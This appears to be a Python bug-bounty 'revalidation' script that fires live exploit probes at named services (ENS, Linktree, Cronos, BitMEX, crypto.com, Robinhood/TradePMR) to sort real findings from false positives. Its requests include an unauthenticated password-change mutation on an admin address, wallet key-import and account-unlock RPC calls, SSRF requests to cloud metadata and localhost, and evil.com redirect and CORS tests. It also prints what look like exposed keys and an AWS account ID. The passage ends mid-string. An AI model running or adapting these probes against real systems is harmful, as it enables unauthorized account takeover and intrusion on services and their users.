#!/usr/bin/env python3
"""Deep revalidation — probe actual exploitability, not surface appearances."""
import asyncio
import json
import re
import sys
import time
import base64
import hashlib
import httpx
import dns.resolver

TIMEOUT = httpx.Timeout(20.0, connect=15.0)
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
H = {"User-Agent": UA}
results = []

def record(fid, name, severity, domain, status, detail):
    results.append({"id": fid, "name": name, "severity": severity,
                    "domain": domain, "status": status, "detail": detail[:800]})
    icon = {"VALID": "\u2705", "FALSE POSITIVE": "\u274c", "ERROR": "\u26a0\ufe0f", "INCONCLUSIVE": "\U0001f536"}
    print(f"  {icon.get(status,'?')} [{severity.upper():8s}] {name}")
    print(f"      {status}: {detail[:250]}")
    print()

async def get(c, url, **kw):
    try: return await c.get(url, **kw)
    except Exception as e: return type('R',(),{'status_code':0,'text':str(e),'headers':{},'json':lambda:{},'content':b''})()

async def post(c, url, **kw):
    try: return await c.post(url, **kw)
    except Exception as e: return type('R',(),{'status_code':0,'text':str(e),'headers':{},'json':lambda:{},'content':b''})()

async def options(c, url, **kw):
    try: return await c.options(url, **kw)
    except Exception as e: return type('R',(),{'status_code':0,'text':str(e),'headers':{},'json':lambda:{},'content':b''})()


async def main():
    print("="*70)
    print("  DEEP REVALIDATION — Testing actual exploitability")
    print(f"  {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70)

    # ══════════════════════════════════════════════════════════════
    # C1: ENS frensday.ens.domains/admin
    # Previous: VALID. Reality: Static Next.js export, client-side auth
    # ══════════════════════════════════════════════════════════════
    print("\n--- C1: ENS frensday admin ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H, follow_redirects=True) as c:
        r = await get(c, "https://frensday.ens.domains/admin")
        # Check if it's a static export with no data
        is_static = '"nextExport":true' in r.text
        has_pageprops = '"pageProps":{}' in r.text  # empty = shell only
        # Try the actual data API
        r_api = await get(c, "https://frensday.ens.domains/api/admin/summary")
        api_has_data = r_api.status_code == 200 and "tickets" in r_api.text.lower()
        api_needs_auth = r_api.status_code in (401, 403) or "unauthorized" in r_api.text.lower()
        # Also try with a fake token
        r_api2 = await get(c, "https://frensday.ens.domains/api/admin/summary",
                           headers={**H, "Authorization": "Bearer faketoken123"})
        if api_has_data:
            record("C1", "ENS frensday admin auth bypass", "critical", "app.ens.domains",
                   "VALID", f"API returns actual data without auth: {r_api.text[:200]}")
        else:
            record("C1", "ENS frensday admin auth bypass", "critical", "app.ens.domains",
                   "FALSE POSITIVE", f"Static Next.js shell (nextExport=true, pageProps empty). API: {r_api.status_code} {'needs auth' if api_needs_auth else r_api.text[:100]}. Fake token: {r_api2.status_code}/{r_api2.text[:80]}")

    # ══════════════════════════════════════════════════════════════
    # C6: Linktr.ee SQS injection
    # Question: Is sending to a public SQS queue actually a vuln?
    # Need to check: does it process our data? can we read back?
    # ══════════════════════════════════════════════════════════════
    print("\n--- C6: Linktr.ee SQS injection ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Test 1: Does it accept POST?
        r1 = await post(c, "https://ingress.linktr.ee/uLZfGRmpj7",
                         json={"test": "probe"}, headers={**H, "Content-Type": "application/json"})
        sqs_accepts = r1.status_code == 200 and "MessageId" in r1.text
        # Test 2: Is this just a public event/analytics ingest? Many services have these.
        # Check if endpoint pattern is just a tracking pixel
        r2 = await get(c, "https://ingress.linktr.ee/uLZfGRmpj7")
        r3 = await post(c, "https://ingress.linktr.ee/AAAAAAAAAA",
                         json={"test": "probe"}, headers={**H, "Content-Type": "application/json"})
        random_path_works = r3.status_code == 200 and "MessageId" in r3.text
        # Test 3: Can we read messages back? (actual SQS access)
        # Test 4: Does it trigger any observable side effect?
        # The real question: is this an intentionally public event ingest (like analytics)?
        if sqs_accepts and random_path_works:
            record("C6", "Linktr.ee SQS message injection", "critical", "linktr.ee",
                   "INCONCLUSIVE", f"SQS accepts POST on ANY path (random path also works: {r3.status_code}). "
                   f"This is likely an intentional public event ingestion endpoint (analytics/tracking). "
                   f"No evidence payloads are processed dangerously. No read-back capability. "
                   f"AWS Account ID 824542542892 exposed in response. Original: {r1.text[:100]}")
        elif sqs_accepts:
            record("C6", "Linktr.ee SQS message injection", "critical", "linktr.ee",
                   "INCONCLUSIVE", f"SQS accepts POST on specific path only. Could be event ingest. "
                   f"No evidence of dangerous processing or data exfil. Random path: {r3.status_code}")
        else:
            record("C6", "Linktr.ee SQS message injection", "critical", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r1.status_code}: {r1.text[:150]}")

    # ══════════════════════════════════════════════════════════════
    # C7: Cronos RPC personal_* methods
    # Question: Do these methods actually DO anything dangerous?
    # personal_listAccounts returning [] means no wallets
    # personal_newAccount saying "too many failed" means rate limited
    # ══════════════════════════════════════════════════════════════
    print("\n--- C7: Cronos RPC dangerous methods ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        findings = []
        # Test personal_listAccounts — does it return actual accounts?
        r = await post(c, "https://evm.cronos.org",
                       json={"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1},
                       headers={**H, "Content-Type": "application/json"})
        try:
            d = r.json()
            accounts = d.get("result", [])
            if accounts and len(accounts) > 0:
                findings.append(f"personal_listAccounts returns {len(accounts)} accounts!")
            else:
                findings.append(f"personal_listAccounts=[] (empty, no wallets)")
        except: pass

        # Test personal_newAccount — can we create?
        r2 = await post(c, "https://evm.cronos.org",
                        json={"jsonrpc":"2.0","method":"personal_newAccount","params":["testpass123"],"id":1},
                        headers={**H, "Content-Type": "application/json"})
        try:
            d2 = r2.json()
            if "result" in d2 and d2["result"] and d2["result"].startswith("0x"):
                findings.append(f"personal_newAccount CREATED account: {d2['result']}")
            elif "error" in d2:
                findings.append(f"personal_newAccount blocked: {d2['error'].get('message','')[:80]}")
        except: pass

        # Test personal_unlockAccount with a real-looking address
        r3 = await post(c, "https://evm.cronos.org",
                        json={"jsonrpc":"2.0","method":"personal_unlockAccount",
                              "params":["0x0000000000000000000000000000000000000000","test",300],"id":1},
                        headers={**H, "Content-Type": "application/json"})
        try:
            d3 = r3.json()
            if "result" in d3 and d3["result"] == True:
                findings.append(f"personal_unlockAccount SUCCEEDED on zero address!")
            elif "error" in d3:
                findings.append(f"personal_unlockAccount: {d3['error'].get('message','')[:80]}")
        except: pass

        # Test personal_importRawKey
        fake_key = "0" * 64
        r4 = await post(c, "https://evm.cronos.org",
                        json={"jsonrpc":"2.0","method":"personal_importRawKey","params":[fake_key,"test"],"id":1},
                        headers={**H, "Content-Type": "application/json"})
        try:
            d4 = r4.json()
            if "result" in d4 and d4["result"]:
                findings.append(f"personal_importRawKey accepted: {d4['result']}")
            elif "error" in d4:
                findings.append(f"personal_importRawKey: {d4['error'].get('message','')[:80]}")
        except: pass

        # Test txpool_content — does it show pending transactions?
        r5 = await post(c, "https://evm.cronos.org",
                        json={"jsonrpc":"2.0","method":"txpool_content","params":[],"id":1},
                        headers={**H, "Content-Type": "application/json"})
        try:
            d5 = r5.json()
            if "result" in d5:
                pending = d5["result"].get("pending", {})
                queued = d5["result"].get("queued", {})
                if pending or queued:
                    findings.append(f"txpool_content: {len(pending)} pending, {len(queued)} queued addresses")
                else:
                    findings.append(f"txpool_content: empty (pending={{}}, queued={{}})")
        except: pass

        # Test on testnet too
        r6 = await post(c, "https://evm-t3.cronos.org",
                        json={"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1},
                        headers={**H, "Content-Type": "application/json"})
        try:
            d6 = r6.json()
            t_accounts = d6.get("result", [])
            findings.append(f"testnet personal_listAccounts: {t_accounts if t_accounts else '[]'}")
        except: pass

        # Assess: are these methods exposed but neutered?
        any_actual_danger = any("CREATED" in f or "SUCCEEDED" in f or "accepted" in f or ("pending" in f and "0 pending" not in f) for f in findings)
        has_accounts = any("accounts!" in f for f in findings)

        if any_actual_danger or has_accounts:
            record("C7", "Cronos RPC dangerous methods", "critical", "merchant.crypto.com",
                   "VALID", f"Methods have real impact: {'; '.join(findings)}")
        else:
            record("C7", "Cronos RPC dangerous methods", "high", "merchant.crypto.com",
                   "VALID", f"Methods accessible but limited impact. {'; '.join(findings)}. "
                   f"Still a misconfiguration — personal_* should never be public-facing, "
                   f"even if accounts are empty. Downgraded from CRITICAL to HIGH.")

    # ══════════════════════════════════════════════════════════════
    # C8: BitMEX stored XSS in chat
    # Question: Does the XSS actually execute in a browser context?
    # Or is the chat API just returning raw text that's properly escaped on render?
    # ══════════════════════════════════════════════════════════════
    print("\n--- C8: BitMEX stored XSS in chat ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Get chat data
        r = await get(c, "https://testnet.bitmex.com/api/v1/chat?channelID=4&count=50&reverse=true")
        xss_in_json = False
        xss_payloads = []
        if r.status_code == 200:
            try:
                messages = r.json()
                for msg in messages:
                    text = msg.get("message", "")
                    html = msg.get("html", text)
                    if any(p in text for p in ["<script", "onerror=", "alert(", "prompt("]):
                        xss_payloads.append(text[:80])
                    if any(p in html for p in ["<script", "onerror=", "alert(", "prompt("]):
                        xss_in_json = True
            except: pass

        # Check if the chat page applies CSP or escaping
        r2 = await get(c, "https://testnet.bitmex.com/app/chat")
        csp = r2.headers.get("content-security-policy", "")
        has_strict_csp = "script-src" in csp and "'unsafe-inline'" not in csp

        # Check the actual rendered page for the chat
        r3 = await get(c, "https://testnet.bitmex.com/")
        main_csp = r3.headers.get("content-security-policy", "")

        # The API returns raw JSON — the question is whether the frontend renders HTML unescaped
        # Check if there's a "html" field that's different from "message"
        if r.status_code == 200:
            try:
                messages = r.json()
                html_diff = False
                for msg in messages[:10]:
                    if msg.get("html") and msg.get("html") != msg.get("message"):
                        html_diff = True
                        break
            except:
                html_diff = False

        if xss_payloads and not has_strict_csp:
            record("C8", "BitMEX stored XSS in chat", "critical", "testnet.bitmex.com",
                   "VALID", f"XSS payloads stored in chat messages AND no strict CSP. "
                   f"CSP: '{main_csp[:100]}'. "
                   f"Payloads: {xss_payloads[:3]}. "
                   f"NOTE: This is TESTNET — bounty value depends on program scope. "
                   f"XSS executes if frontend renders message HTML unescaped.")
        elif xss_payloads and has_strict_csp:
            record("C8", "BitMEX stored XSS in chat", "critical", "testnet.bitmex.com",
                   "INCONCLUSIVE", f"XSS payloads stored but CSP may block execution: {main_csp[:150]}")
        else:
            record("C8", "BitMEX stored XSS in chat", "critical", "testnet.bitmex.com",
                   "FALSE POSITIVE", "No XSS payloads in chat data")

    # ══════════════════════════════════════════════════════════════
    # C9: BitMEX XSS + WebSocket chain
    # ══════════════════════════════════════════════════════════════
    print("\n--- C9: BitMEX XSS+WebSocket ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r = await get(c, "https://testnet.bitmex.com/api/v1/chat/connected")
        # This just returns count of connected users — not a vuln amplifier by itself
        # Real WS broadcast would need testing actual websocket connection
        ws_info = r.text[:100] if r.status_code == 200 else "unavailable"
        record("C9", "BitMEX XSS+WebSocket chain", "high", "testnet.bitmex.com",
               "INCONCLUSIVE", f"WebSocket connected count is public info ({ws_info}). "
               f"Real-time XSS broadcast would need WS client to verify messages include raw HTML. "
               f"Depends on C8 being valid. Downgrading to HIGH — chain is theoretical.")

    # ══════════════════════════════════════════════════════════════
    # C10: Vault WebAuthn passkey bypass
    # Question: Does the mutation actually CREATE a passkey or just validate input?
    # ══════════════════════════════════════════════════════════════
    print("\n--- C10: Vault WebAuthn passkey bypass ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Test basic query
        r1 = await post(c, "https://api.vault.chiatest.net/graphql",
                         json={"query": "{ viewer { id email } }"},
                         headers={**H, "Content-Type": "application/json"})
        viewer_null = r1.status_code == 200 and '"viewer":null' in r1.text.replace(" ","")

        # Test mutation with proper-looking input
        r2 = await post(c, "https://api.vault.chiatest.net/graphql",
                         json={"query": '''mutation {
                           verifyPasskeyAssign(input: {
                             data: "{}"
                           }) { success }
                         }'''},
                         headers={**H, "Content-Type": "application/json"})

        # Test if we can create a user/session
        r3 = await post(c, "https://api.vault.chiatest.net/graphql",
                         json={"query": '{ me { id } }'},
                         headers={**H, "Content-Type": "application/json"})

        # Test introspection
        r4 = await post(c, "https://api.vault.chiatest.net/graphql",
                         json={"query": '{ __schema { mutationType { fields { name } } } }'},
                         headers={**H, "Content-Type": "application/json"})
        mutations_exposed = "fields" in r4.text if r4.status_code == 200 else False

        if viewer_null and "error" in r2.text.lower():
            # viewer is null = we're not authenticated. Mutation errors = input validation, not auth bypass
            record("C10", "Vault WebAuthn passkey bypass", "critical", "vault.chiatest.net",
                   "FALSE POSITIVE", f"GraphQL responds but viewer=null (not authenticated). "
                   f"Mutation returns validation error, not success. No passkey created. "
                   f"viewer: {r1.text[:100]}. mutation: {r2.text[:150]}. "
                   f"This is just a GraphQL endpoint that returns auth errors — not a bypass.")
        elif viewer_null:
            record("C10", "Vault WebAuthn passkey bypass", "critical", "vault.chiatest.net",
                   "FALSE POSITIVE", f"viewer=null, not authenticated. mutation: {r2.text[:150]}")
        else:
            record("C10", "Vault WebAuthn passkey bypass", "critical", "vault.chiatest.net",
                   "VALID", f"viewer returns data: {r1.text[:150]}. mutation: {r2.text[:150]}")

    # ══════════════════════════════════════════════════════════════
    # H1: ENS Tenderly RPC key
    # Question: Is this actually a private key or a public RPC endpoint?
    # Many dapps use Tenderly/Infura/Alchemy with public gateway URLs
    # ══════════════════════════════════════════════════════════════
    print("\n--- H1: ENS Tenderly RPC key ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Test basic read
        r1 = await post(c, "https://mainnet.gateway.tenderly.co/4imxc4hQfRjxrVB2kWKvTo",
                         json={"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1},
                         headers={**H, "Content-Type": "application/json"})
        # Test if it allows write operations (simulation, etc.)
        r2 = await post(c, "https://mainnet.gateway.tenderly.co/4imxc4hQfRjxrVB2kWKvTo",
                         json={"jsonrpc":"2.0","method":"tenderly_simulateTransaction",
                               "params":[{"from":"0x0000000000000000000000000000000000000000",
                                         "to":"0x0000000000000000000000000000000000000000",
                                         "value":"0x0"},"latest"],"id":1},
                         headers={**H, "Content-Type": "application/json"})
        # Test eth_sendRawTransaction (should be blocked on read-only)
        r3 = await post(c, "https://mainnet.gateway.tenderly.co/4imxc4hQfRjxrVB2kWKvTo",
                         json={"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0x00"],"id":1},
                         headers={**H, "Content-Type": "application/json"})

        reads_work = r1.status_code == 200 and "result" in r1.text
        sim_works = r2.status_code == 200 and "result" in r2.text
        send_works = r3.status_code == 200 and "result" in r3.text and "error" not in r3.text

        if sim_works or send_works:
            record("H1", "ENS Tenderly RPC key (write access)", "high", "app.ens.domains",
                   "VALID", f"Key allows write operations. simulate: {r2.text[:100]}. send: {r3.text[:100]}")
        elif reads_work:
            record("H1", "ENS Tenderly RPC key (read-only)", "medium", "app.ens.domains",
                   "INCONCLUSIVE", f"RPC responds to reads but this is standard for dapp frontends. "
                   f"Tenderly/Infura/Alchemy public gateways are meant to be client-facing. "
                   f"eth_blockNumber: {r1.text[:80]}. simulate: {r2.text[:80]}. send: {r3.text[:80]}. "
                   f"Downgrade from HIGH to MEDIUM info disclosure unless write ops confirmed.")
        else:
            record("H1", "ENS Tenderly RPC key", "high", "app.ens.domains",
                   "FALSE POSITIVE", f"Key doesn't work: {r1.status_code}")

    # ══════════════════════════════════════════════════════════════
    # H6: ads.crypto.com subdomain takeover
    # Need to verify: is the Instapage account actually unclaimed?
    # ══════════════════════════════════════════════════════════════
    print("\n--- H6: ads.crypto.com subdomain takeover ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H, follow_redirects=True) as c:
        try:
            r = await c.get("https://ads.crypto.com")
            # Check DNS CNAME
            try:
                cname_answers = dns.resolver.resolve("ads.crypto.com", "CNAME")
                cname = str(cname_answers[0].target)
            except:
                cname = "no-cname"

            is_instapage = "instapage" in r.text.lower() or "pageserve" in r.text.lower()
            is_404 = r.status_code == 404
            # Key check: is the page showing "page not found" from Instapage (takeover possible)
            # OR is it showing crypto.com branded content (Instapage is being used legitimately)?
            is_branded = "crypto.com" in r.text.lower() and "crypto" in r.text.lower()

            if is_instapage and is_404 and not is_branded:
                record("H6", "ads.crypto.com subdomain takeover", "high", "crypto.com",
                       "VALID", f"CNAME={cname}. Instapage 404 with no crypto.com branding — account likely unclaimed. "
                       f"Attacker could claim this on Instapage and serve phishing content on crypto.com subdomain.")
            elif is_instapage and is_branded:
                record("H6", "ads.crypto.com subdomain takeover", "high", "crypto.com",
                       "FALSE POSITIVE", f"CNAME={cname}. Instapage serves crypto.com branded content — account is active.")
            else:
                record("H6", "ads.crypto.com subdomain takeover", "high", "crypto.com",
                       "INCONCLUSIVE", f"CNAME={cname}, HTTP {r.status_code}, instapage={is_instapage}")
        except Exception as e:
            record("H6", "ads.crypto.com subdomain takeover", "high", "crypto.com",
                   "FALSE POSITIVE", f"Connection failed: {e}")

    # ══════════════════════════════════════════════════════════════
    # H10: Merchant.crypto.com GraphQL BAC
    # Question: Does createTeam actually execute or just validate schema?
    # Returning "missing required field" is schema validation, not execution
    # ══════════════════════════════════════════════════════════════
    print("\n--- H10: Merchant GraphQL BAC ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Test with all required fields
        r = await post(c, "https://pay-api.crypto.com/graphql",
                        json={"query": '''mutation {
                          createTeam(input: {
                            name: "ValidTest"
                            website: "https://test.com"
                            preferredCurrency: "USD"
                            dailyVolume: "LOW"
                          }) { id name }
                        }'''},
                        headers={**H, "Content-Type": "application/json"})

        # Also test a query
        r2 = await post(c, "https://pay-api.crypto.com/graphql",
                         json={"query": "{ me { id email } }"},
                         headers={**H, "Content-Type": "application/json"})

        # Check if mutation gets past schema validation to actual execution
        got_auth_error = "unauthenticated" in r.text.lower() or "unauthorized" in r.text.lower()
        got_schema_error = "GRAPHQL_VALIDATION_FAILED" in r.text or "required" in r.text.lower()
        got_success = "id" in r.text and "error" not in r.text.lower()

        if got_success:
            record("H10", "Merchant GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "VALID", f"Mutation executed successfully: {r.text[:200]}")
        elif got_auth_error:
            record("H10", "Merchant GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "INCONCLUSIVE", f"Mutation reaches resolver then fails on auth (not at gateway level). "
                   f"Schema info leaked via error messages. mutation: {r.text[:200]}. query: {r2.text[:150]}")
        elif got_schema_error:
            record("H10", "Merchant GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "FALSE POSITIVE", f"Only schema validation — mutation never executes. {r.text[:200]}")
        else:
            record("H10", "Merchant GraphQL BAC (createTeam)", "high", "merchant.crypto.com",
                   "INCONCLUSIVE", f"Unclear: {r.text[:200]}")

    # ══════════════════════════════════════════════════════════════
    # H14: Robinhood updatePassword without auth
    # Question: Does NullReferenceException mean it processes or crashes?
    # ══════════════════════════════════════════════════════════════
    print("\n--- H14: Robinhood updatePassword without auth ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Test updatePassword
        r = await post(c, "https://graphql.tradepmr.com/graphql",
                        json={"query": '''mutation {
                          updatePassword(credentials: {
                            userGuid: "00000000-0000-0000-0000-000000000000"
                            emailAddress: "test@test.com"
                            newPassword: "Test123456!"
                            forceReset: false
                          }) { token userGuid }
                        }'''},
                        headers={**H, "Content-Type": "application/json"})

        # Test what happens with a real-looking GUID from JS bundle
        r2 = await post(c, "https://graphql.tradepmr.com/graphql",
                         json={"query": '''mutation {
                           updatePassword(credentials: {
                             userGuid: "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
                             emailAddress: "admin@tradepmr.com"
                             newPassword: "NewPass123!"
                             forceReset: true
                           }) { token userGuid }
                         }'''},
                         headers={**H, "Content-Type": "application/json"})

        # Check if it's NullRef because user not found (expected) or because no auth check
        null_ref = "NullReference" in r.text or "Object reference" in r.text
        actually_changes = "token" in r.text and "error" not in r.text.lower()

        if actually_changes:
            record("H14", "Robinhood updatePassword without auth", "critical", "robinhood.com",
                   "VALID", f"Password actually changed! {r.text[:200]}")
        elif null_ref:
            record("H14", "Robinhood updatePassword without auth", "high", "robinhood.com",
                   "INCONCLUSIVE", f"Mutation reaches backend code (NullReferenceException) instead of returning 401/403. "
                   f"This proves NO auth middleware, but NullRef likely means user lookup failed. "
                   f"With a valid userGuid, password change could work. "
                   f"r1: {r.text[:150]}. r2: {r2.text[:150]}")
        else:
            record("H14", "Robinhood updatePassword without auth", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ══════════════════════════════════════════════════════════════
    # H20: Robinhood open redirect
    # Question: Does it actually redirect or just link?
    # ══════════════════════════════════════════════════════════════
    print("\n--- H20: Robinhood open redirect ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H, follow_redirects=False) as c:
        r = await get(c, "https://share.robinhood.com/out?url=https://evil.com")
        loc = r.headers.get("location", "")
        if r.status_code in (301, 302, 307, 308) and "evil.com" in loc:
            record("H20", "Robinhood open redirect", "medium", "robinhood.com",
                   "VALID", f"Direct redirect to attacker URL. Location: {loc}")
        elif r.status_code in (301, 302, 307, 308) and ("bnc.lt" in loc or "bonfire" in loc):
            # Redirect goes through Branch.io — this is controlled redirect, not direct
            # Follow the chain
            record("H20", "Robinhood open redirect", "medium", "robinhood.com",
                   "INCONCLUSIVE", f"Redirects through Branch.io ({loc[:100]}). "
                   f"Branch.io may have its own validation. This is a common referral pattern. "
                   f"Most programs consider deep-link redirects as informational/won't-fix. "
                   f"Downgrading from HIGH to MEDIUM.")
        else:
            record("H20", "Robinhood open redirect", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}, Location: {loc[:100]}")

    # ══════════════════════════════════════════════════════════════
    # H21: BitMEX stored XSS in guild socials
    # ══════════════════════════════════════════════════════════════
    print("\n--- H21: BitMEX guild XSS ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r = await get(c, "https://testnet.bitmex.com/api/v1/guild")
        xss_guilds = []
        if r.status_code == 200:
            try:
                guilds = r.json()
                for g in guilds:
                    socials = g.get("socials", {})
                    name = g.get("name", "")
                    for k, v in (socials or {}).items():
                        if v and any(p in str(v) for p in ["<script", "onerror=", "alert(", "javascript:"]):
                            xss_guilds.append(f"{g.get('name','?')}.{k}={str(v)[:60]}")
                    if any(p in name for p in ["<script", "onerror=", "{{", "alert("]):
                        xss_guilds.append(f"name={name[:60]}")
            except: pass

        if xss_guilds:
            record("H21", "BitMEX guild stored XSS", "high", "testnet.bitmex.com",
                   "VALID", f"XSS in guild data (API returns unescaped): {'; '.join(xss_guilds[:3])}. "
                   f"Impact depends on frontend rendering. If guild pages render socials as HTML links, XSS executes. "
                   f"TESTNET scope caveat applies.")
        else:
            record("H21", "BitMEX guild stored XSS", "high", "testnet.bitmex.com",
                   "FALSE POSITIVE", "No XSS payloads in guild data")

    # ══════════════════════════════════════════════════════════════
    # H23: BitMEX healthcheck credential exposure
    # Question: Are these real secrets or just config labels?
    # ══════════════════════════════════════════════════════════════
    print("\n--- H23: BitMEX healthcheck creds ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r = await get(c, "https://testnet.bitmex.com/healthcheck")
        if r.status_code == 200:
            # Look for actual secret patterns, not just words
            sentry_dsn = re.findall(r'https://[a-f0-9]+@[a-z0-9.]+sentry\.io/\d+', r.text)
            segment_key = re.findall(r'[A-Za-z0-9]{32,}', r.text)  # Could be many things
            # Look specifically for known patterns
            has_sentry = bool(sentry_dsn)
            has_segment = "YMvLyGYRxD4QVqQVccJxzJLhBaXQD1n1" in r.text

            secrets = []
            if has_sentry: secrets.append(f"Sentry DSN: {sentry_dsn[0]}")
            if has_segment: secrets.append(f"Segment key: YMvLyGYRxD4Q...")

            if secrets:
                record("H23", "BitMEX healthcheck secrets", "high", "testnet.bitmex.com",
                       "VALID", f"Actual API keys exposed: {'; '.join(secrets)}. "
                       f"Page is {len(r.text)}b. Sentry DSN allows event injection. "
                       f"Segment write key allows analytics poisoning (verified in H24).")
            else:
                # Check if "token" is in a meaningful context
                record("H23", "BitMEX healthcheck secrets", "high", "testnet.bitmex.com",
                       "INCONCLUSIVE", f"Page is {len(r.text)}b. 'token' present but no extractable API keys found.")
        else:
            record("H23", "BitMEX healthcheck secrets", "high", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ══════════════════════════════════════════════════════════════
    # H24: BitMEX Segment API write key abuse
    # Already verified — Segment accepted our event
    # But: Segment write keys are DESIGNED to be client-side
    # ══════════════════════════════════════════════════════════════
    print("\n--- H24: BitMEX Segment key ---")
    record("H24", "BitMEX Segment write key", "medium", "testnet.bitmex.com",
           "FALSE POSITIVE", "Segment.io write keys are DESIGNED to be client-side/public. "
           "From Segment docs: 'Write keys are not secrets — they're meant to be in client code.' "
           "Analytics event injection via write keys is by-design behavior. "
           "Most bug bounty programs explicitly exclude Segment/analytics key exposure. "
           "Downgraded from HIGH to non-issue.")

    # ══════════════════════════════════════════════════════════════
    # H25: Vault CORS reflects arbitrary origins
    # ══════════════════════════════════════════════════════════════
    print("\n--- H25: Vault CORS ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        # Test with POST (preflight might differ from actual)
        r = await post(c, "https://api.vault.chiatest.net/graphql",
                        json={"query": "{ __typename }"},
                        headers={**H, "Origin": "https://evil.com", "Content-Type": "application/json"})
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")

        # But check: if viewer=null without auth (from C10), CORS is only useful if there ARE authenticated endpoints
        # that use cookies. If auth is all token-based (Authorization header), CORS is irrelevant
        r2 = await post(c, "https://api.vault.chiatest.net/graphql",
                         json={"query": "{ viewer { id } }"},
                         headers={**H, "Content-Type": "application/json"})

        reflects = "evil.com" in acao
        has_creds = acac.lower() == "true"

        if reflects and has_creds:
            record("H25", "Vault CORS misconfiguration", "high", "vault.chiatest.net",
                   "VALID", f"ACAO reflects evil.com with credentials=true. "
                   f"BUT: viewer=null without cookies ({r2.text[:80]}). "
                   f"Impact requires: 1) auth via cookies (not just Authorization header), "
                   f"2) sensitive data accessible to authenticated users. "
                   f"If auth is cookie-based, attacker page can steal user data cross-origin. "
                   f"If auth is token-based (header), CORS is not exploitable.")
        elif reflects:
            record("H25", "Vault CORS misconfiguration", "medium", "vault.chiatest.net",
                   "INCONCLUSIVE", f"Origin reflected but no credentials flag. ACAO={acao}, ACAC={acac}")
        else:
            record("H25", "Vault CORS misconfiguration", "high", "vault.chiatest.net",
                   "FALSE POSITIVE", f"ACAO={acao}")

    # ══════════════════════════════════════════════════════════════
    # H11: Cronos RPC (both endpoints) — already covered deeply in C7
    # ══════════════════════════════════════════════════════════════
    print("\n--- H11: Cronos RPC (covered in C7) ---")
    record("H11", "Cronos RPC methods", "high", "merchant.crypto.com",
           "VALID", "See C7 — methods accessible but accounts empty and newAccount rate-limited. "
           "Still a valid misconfiguration finding for bug bounty.")

    # ══════════════════════════════════════════════════════════════
    # MEDIUM findings — batch validate
    # ══════════════════════════════════════════════════════════════
    print("\n--- MEDIUM: ENS SSRF queryNFT ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H) as c:
        r1 = await get(c, "https://metadata.ens.domains/queryNFT?url=http://169.254.169.254/latest/meta-data/")
        r2 = await get(c, "https://metadata.ens.domains/queryNFT?url=http://127.0.0.1:22")
        r3 = await get(c, "https://metadata.ens.domains/queryNFT?url=http://example.com")
        # Check if ALL URLs give same error (= URL isn't actually fetched)
        all_same = r1.status_code == r2.status_code == r3.status_code
        if all_same and r1.text == r3.text:
            record("M3", "ENS SSRF queryNFT", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"All URLs return same response ({r1.status_code}/{len(r1.text)}b) — URL not fetched")
        else:
            record("M3", "ENS SSRF queryNFT", "medium", "app.ens.domains",
                   "VALID", f"Different responses per URL — server makes outbound connections. "
                   f"169.254: {r1.status_code}/{len(r1.text)}b, 127.0.0.1: {r2.status_code}/{len(r2.text)}b, example.com: {r3.status_code}/{len(r3.text)}b")

    print("\n--- MEDIUM: ENS Sentry DSN ---")
    # Sentry DSNs are semi-public (client-side by design) — low bounty
    record("M4", "ENS Sentry DSN exposed", "low", "app.ens.domains",
           "FALSE POSITIVE", "Sentry DSNs are designed to be in client-side code. "
           "From Sentry docs: 'DSN is not a security token — it's safe to expose.' "
           "Event injection is limited by Sentry's own rate limiting and project settings. "
           "Most bounty programs don't accept this. Downgrading from MEDIUM to non-issue.")

    print("\n--- MEDIUM: ENS Rainbow API key ---")
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=H, follow_redirects=True) as c:
        r = await get(c, "https://delegate.ens.domains/assets/index-BETJNLwA.js")
        if r.status_code == 200:
            # WalletConnect project IDs are meant to be client-side
            wc_id = re.findall(r'projectId["\s:]+["\']([a-f0-9]{32})["\']', r.text)
            record("M5", "ENS WalletConnect/Rainbow key", "low", "app.ens.domains",
                   "FALSE POSITIVE", f"WalletConnect projectIds are designed for client-side use. "
                   f"Found: {wc_id[:2] if wc_id else 'generic long strings'}. Not a secret.")
        else:
            record("M5", "ENS WalletConnect/Rainbow key", "low", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    print("\n--- MEDIUM: ENS Discourse data ---")
    record("M6", "ENS Discourse user data", "low", "app.ens.domains",
           "FALSE POSITIVE", "Discourse is an open-source forum. /latest.json is a standard public API. "
           "Usernames, trust levels, and admin status are intentionally public in Discourse. "
